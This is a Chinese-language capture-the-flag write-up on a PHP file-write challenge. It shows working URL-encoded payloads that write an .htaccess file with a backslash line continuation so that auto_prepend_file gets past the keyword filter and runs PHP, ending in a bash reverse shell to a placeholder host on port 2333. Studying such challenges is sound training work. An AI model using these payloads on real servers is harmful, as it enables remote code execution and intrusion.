![](<./img/Pasted image 20230226142322.png>)

```php
 <?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nHello, world");
?> 
```

可以写入文件，虽然会删除`index.php`之外的文件，但是不访问`index.php`就能一直留着

```
/?filename=info.php&content=<?php phpinfo();?>
```

```
/info.php
```

![](<./img/Pasted image 20230226142803.png>)

并没有被解析

尝试直接往`index.php`写入

```
/?filename=index.php&content=<?php phpinfo();?>
```

莫得用

尝试往`.htaccess`写入，同时利用`.htaccess`的反斜杠续行绕过关键词检测

```
/?filename=.htaccess&content=php_value auto_prepend_fi\
le .htaccess
#<?php phpinfo();?>
#\
```

url编码

```
/?filename=.htaccess&content=php_value+auto_prepend_fi%5C%0D%0Ale+.htaccess%0D%0A%23%3C%3Fphp+phpinfo()%3B%3F%3E%0D%0A%23%5C
```

![](<./img/Pasted image 20230226151014.png>)

同理可弹shell

```
/?filename=.htaccess&content=php_value auto_prepend_fi\
le .htaccess
#<?php system('bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"');?>
#\
```

url编码

```
/?filename=.htaccess&content=php_value+auto_prepend_fi%5C%0D%0Ale+.htaccess%0D%0A%23%3C%3Fphp+system(%27bash+%2Dc+%22bash+%2Di+%3E%26+%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F2333+0%3E%261%22%27)%3B%3F%3E%0D%0A%23%5C
```

![](<./img/Pasted image 20230226154124.png>)

#Web #PHP #htaccess #RCE #reverse_shell